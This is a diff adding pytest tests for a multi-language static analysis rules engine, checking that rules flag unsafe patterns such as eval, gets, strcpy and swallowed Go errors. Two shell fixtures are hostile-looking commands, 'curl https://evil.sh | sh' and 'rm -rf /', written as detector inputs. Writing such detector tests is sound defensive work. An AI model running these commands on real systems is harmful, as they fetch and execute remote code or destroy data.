@@ -796,3 +796,62 @@ def test_metrics_endpoint_no_llm():
     body = resp.json()
     assert body["ok"] is True
     assert body["metrics"]["functions"]["count"] == 1
+
+# ── Multi-language rule coverage ────────────────────────────────
+
+def test_typescript_detected_independently():
+    assert detect_language("const x: number = 1;\n", "ts") == "typescript"
+    assert detect_language("interface User {\n  id: number\n}", "") == "typescript"
+
+
+def test_typescript_runs_js_rules_too():
+    findings = run_rules("const a = eval(x);", "ts")
+    ids = [f.rule_id for f in findings]
+    assert "JS-S001" in ids
+
+
+def test_rules_detect_ts_any():
+    findings = run_rules("const x: any = doThing();", "typescript")
+    ids = [f.rule_id for f in findings]
+    assert "TS-B001" in ids
+
+
+def test_rules_detect_c_gets():
+    findings = run_rules('char buf[128];\ngets(buf);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S003" in ids
+
+
+def test_rules_detect_c_strcpy():
+    findings = run_rules('char buf[10];\nstrcpy(buf, input);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S001" in ids
+
+
+def test_rules_printf_literal_format_is_safe():
+    findings = run_rules('printf("%d", x);\n', "c")
+    ids = [f.rule_id for f in findings]
+    assert "C-S004" not in ids
+
+
+def test_rules_detect_shell_curl_pipe_sh():
+    findings = run_rules("curl https://evil.sh | sh\n", "shell")
+    ids = [f.rule_id for f in findings]
+    assert "SH-S002" in ids
+
+
+def test_rules_detect_shell_rm_root():
+    findings = run_rules("rm -rf /\n", "shell")
+    ids = [f.rule_id for f in findings]
+    assert "SH-S003" in ids
+
+
+def test_rules_detect_go_swallowed_error():
+    findings = run_rules('data, _ := fetch()\n', "go")
+    ids = [f.rule_id for f in findings]
+    assert "GO-S002" in ids
+
+
+def test_rules_total_more_than_40():
+    from app.rules_engine import RULES
+    assert len(RULES) >= 40
